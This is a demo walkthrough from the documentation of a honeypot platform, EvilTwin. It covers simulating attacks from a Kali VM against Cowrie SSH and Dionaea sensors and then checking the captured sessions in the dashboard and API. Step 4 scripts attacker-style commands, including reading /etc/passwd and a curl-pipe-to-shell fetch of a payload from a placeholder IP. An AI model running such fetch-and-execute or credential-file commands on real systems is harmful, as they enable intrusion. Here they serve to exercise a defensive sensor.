---
id: kali-demo-walkthrough
title: Kali Demo Walkthrough
sidebar_position: 12
slug: /kali-demo-walkthrough
---

This walkthrough is the fastest reliable way to demonstrate EvilTwin end to end. You will start the stack on the host machine, log in with the seeded analyst account, attack both the Cowrie SSH honeypot and the Dionaea non-SSH sensors from a Kali Linux VM, and verify that the dashboard and API show the resulting sessions.

## What This Demo Proves

- Cowrie accepts attacker traffic on the exposed SSH honeypot port
- The backend tails Cowrie's mounted JSON log in real time
- Dionaea accepts FTP, HTTP, and SMB-style traffic on the exposed demo ports
- The backend tails Dionaea's mounted JSON incident stream in real time
- Ingestion persists the session and attacker profile in PostgreSQL
- Threat scoring runs and updates the analyst views
- The dashboard shows the session, commands, map point, and any alert generated for the score

## Before You Start

Run these steps on the host machine that is running Docker:

```bash
cd EvilTwin
docker compose up --build -d
docker compose ps
```

Make sure at least these services are up before you continue:

- `eviltwin-backend`
- `eviltwin-postgres`
- `eviltwin-cowrie`
- `eviltwin-dionaea`
- `eviltwin-frontend`

The backend container now handles three startup tasks automatically:

- trains a replacement ML model if `MODEL_PATH` is missing
- runs `alembic upgrade head`
- seeds the demo analyst account when `DEMO_BOOTSTRAP=true`

If you want to confirm that bootstrap completed, inspect the backend logs:

```bash
docker compose logs backend --tail=40
```

## Step 1 — Determine the Host IP Reachable From Kali

From the Docker host, choose an IP address your Kali VM can reach. On a typical bridged or host-only network, the first address from `hostname -I` is enough:

```bash
hostname -I
```

On Kali, set that value as an environment variable:

```bash
export EVILTWIN_HOST=<HOST_IP_FROM_DOCKER_HOST>
```

Do not use `localhost` from Kali unless the VM is running on the same machine namespace as the Docker host.

## Step 2 — Log In With the Seeded Demo Analyst

The default compose file seeds this analyst account unless you override the environment variables:

```bash
export DEMO_EMAIL=analyst@eviltwin.local
export DEMO_PASSWORD=eviltwin-demo
```

Acquire a JWT access token from any machine that can reach the Docker host on the LAN:

```bash
TOKEN=$(curl -s -X POST "http://${EVILTWIN_HOST}:8000/auth/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "username=${DEMO_EMAIL}" \
  --data-urlencode "password=${DEMO_PASSWORD}" \
  | python3 -c "import sys, json; print(json.load(sys.stdin)['access_token'])")

echo "Token prefix: ${TOKEN:0:24}..."
```

If you prefer a different analyst account, register one with JSON and then use the same form-encoded login flow:

```bash
curl -s -X POST "http://${EVILTWIN_HOST}:8000/auth/register" \
  -H "Content-Type: application/json" \
  -d '{"email":"operator@eviltwin.local","password":"SecurePass123!"}' \
  | python3 -m json.tool
```

## Step 3 — Open the Dashboard

Open `http://${EVILTWIN_HOST}:3000` in a browser on the Docker host or any other machine on the same network and log in with the same demo credentials.

You should land on the authenticated dashboard shell. The login screen no longer mounts the live WebSocket shell before authentication, so a clean login page is expected.

## Step 4 — Launch the SSH Attack From Kali

From the Kali VM, start an SSH session against Cowrie. Any password works because Cowrie is a deception sensor, not a real SSH daemon.

```bash
ssh -p 2222 \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  root@${EVILTWIN_HOST}
```

When prompted for a password, enter anything. `toor` is a convenient demo value.

After the fake shell opens, run these exact commands:

```bash
whoami
id
uname -a
cat /etc/passwd | head
cd /tmp
wget http://198.51.100.25/payload.sh
curl -fsSL http://198.51.100.25/bootstrap.sh | sh
exit
```

Why these commands work well in a demo:

- `whoami`, `id`, and `uname -a` look like reconnaissance
- `cat /etc/passwd | head` is easy for an audience to recognize
- `wget` and `curl` show clear payload retrieval intent
- the commands are recorded even though Cowrie does not execute them on a real host

## Step 5 — Trigger the Non-SSH Dionaea Sensors

From the Kali VM, generate one HTTP request, one FTP interaction, and one SMB-style probe against Dionaea's published demo ports:

```bash
curl -s -o /dev/null -D - http://${EVILTWIN_HOST}:8081/

printf 'USER anonymous\r\nPASS demo@example.com\r\nQUIT\r\n' \
  | nc -nv ${EVILTWIN_HOST} 2121

printf 'HELLO\r\n' | nc -nv -w 2 ${EVILTWIN_HOST} 1445 || true
```

Why these commands work well in a demo:

- the HTTP request creates a clean Dionaea `http` session that is easy to explain
- the FTP interaction records credential-style commands in the Dionaea parser path
- the SMB probe proves non-SSH traffic is also captured, even without a full login
- all three paths enter the same backend ingest and scoring pipeline used by Cowrie

## Step 6 — Watch the Dashboard Update

Within a few seconds, the dashboard should show:

- new session rows in the Sessions view for both `cowrie` and `dionaea`
- the commands you typed in the Cowrie shell and any FTP commands observed by Dionaea
- the attacker's location on the map when geo enrichment is available
- an alert entry if the resulting threat level crosses the alert threshold

If you want a live backend-side view while presenting, tail the backend logs from the host:

```bash
docker compose logs -f backend
```

## Step 7 — Verify the Same Sessions Over the API

Replace `<KALI_IP>` with the address of the Kali VM as seen by the Docker host.

```bash
curl -s -H "Authorization: Bearer $TOKEN" \
  "http://${EVILTWIN_HOST}:8000/sessions?page=1&page_size=10&ip=<KALI_IP>" \
  | python3 -m json.tool
```

You can also pull the current threat score directly:

```bash
curl -s -H "Authorization: Bearer $TOKEN" \
  "http://${EVILTWIN_HOST}:8000/score/<KALI_IP>" \
  | python3 -m json.tool
```

Expected API signs of success:

- `items[0].honeypot` is `cowrie`
- `items[0].protocol` is `ssh`
- `items[0].commands` contains the commands from the fake shell
- `items[0].latitude` and `items[0].longitude` are present when enrichment resolves the IP
- `/score/<KALI_IP>` returns a non-error JSON response with `threat_score` and `threat_level`

To isolate the Dionaea side, query the same attacker IP and filter for the honeypot type:

```bash
curl -s -H "Authorization: Bearer $TOKEN" \
  "http://${EVILTWIN_HOST}:8000/sessions?page=1&page_size=20&ip=<KALI_IP>&honeypot=dionaea" \
  | python3 -m json.tool
```

Expected Dionaea signs of success:

- at least one session has `honeypot` set to `dionaea`
- protocols include `http`, `ftp`, or `smb`
- the FTP session contains `USER anonymous` or `PASS demo@example.com` in `commands`

## Step 8 — Pivot Into Analyst Triage

After the session is visible, you can continue the demo as an analyst:

```bash
SESSION_ID=<SESSION_ID_FROM_/sessions>

curl -s -H "Authorization: Bearer $TOKEN" \
  "http://${EVILTWIN_HOST}:8000/sessions/${SESSION_ID}" \
  | python3 -m json.tool
```

If LLM analysis is configured, continue with the incident workflow in [Incident Response Runbook](./incident-response-runbook.md).

## Troubleshooting This Demo

- If Kali cannot connect, verify the VM can reach the Docker host IP and that port `2222` is open.
- If Dionaea traffic does not connect, verify that `2121`, `8081`, and `1445` are reachable from Kali and that `docker compose ps dionaea` shows the container as running.
- If the SSH or Dionaea traffic works but no dashboard data appears, inspect `docker compose logs backend --tail=100`, `docker compose logs cowrie --tail=100`, and `docker compose logs dionaea --tail=100`.
- If login fails, confirm whether you changed `DEMO_USER_EMAIL` or `DEMO_USER_PASSWORD` in `.env` or Compose overrides.
- If `/score/<KALI_IP>` returns zeros, the session may still be very new or the model may be in degraded mode. Check `GET /health` for `model`.
